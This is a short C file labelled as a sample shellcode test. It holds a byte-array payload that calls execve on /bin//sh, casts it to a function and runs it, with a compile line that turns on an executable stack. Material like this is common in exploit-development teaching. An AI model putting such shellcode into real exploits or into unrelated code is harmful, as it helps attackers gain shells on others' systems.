/* A sample shellcode.
 * Compile:
 *   $ gcc -z execstack test-shell.c -o test-shell
*/
#include <stdlib.h>
#include <stdio.h>
const char code[] =
  "\x31\xc0" 
  "\x50" 
  "\x68""//sh" 
  "\x68""/bin" 
  "\x89\xe3" 
  "\x50" 
  "\x53" 
  "\x89\xe1" 
  "\x99"
  "\xb0\x0b" 
  "\xcd\x80" ;

int main(int argc, char **argv)
{
  ((void(*)( ))code)();
  return 0;
}
